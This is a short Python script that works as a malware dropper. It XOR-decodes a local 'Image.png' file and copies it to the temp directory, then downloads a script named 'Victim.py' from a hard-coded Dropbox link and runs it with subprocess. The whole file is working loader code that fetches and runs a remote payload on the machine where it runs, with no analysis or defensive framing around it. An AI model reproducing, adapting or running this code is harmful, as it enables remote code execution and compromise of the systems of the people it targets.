import os
import shutil
import tempfile
import requests
import tempfile
import subprocess

current_dir = os.getcwd()
image_file_name = "Image.png"
image_file_path = os.path.join(current_dir, image_file_name)
temp_path = tempfile.gettempdir()

def decrypt_Image():
    key = 125
    rbin = open(image_file_path, 'rb')
    image = rbin.read()
    rbin.close()
    image = bytearray(image)
    for index, values in enumerate(image):
        image[index] = values ^ key
    wbin = open(image_file_path, 'wb')
    wbin.write(image)
    wbin.close()

def copy_Image():
    shutil.copyfile(image_file_path, temp_path+"\\Image.png")

def download_victim():
    dropbox_link = "https://www.dropbox.com/s/xadc89ghvvenm07/Victim.py?dl=1"
    response = requests.get(dropbox_link)
    with open(temp_path+"\\Victim.py", "wb") as f:
        f.write(response.content)
def run_Victim():
    subprocess.call(["python", temp_path+"\\Victim.py"])

decrypt_Image()
copy_Image()
download_victim()
run_Victim()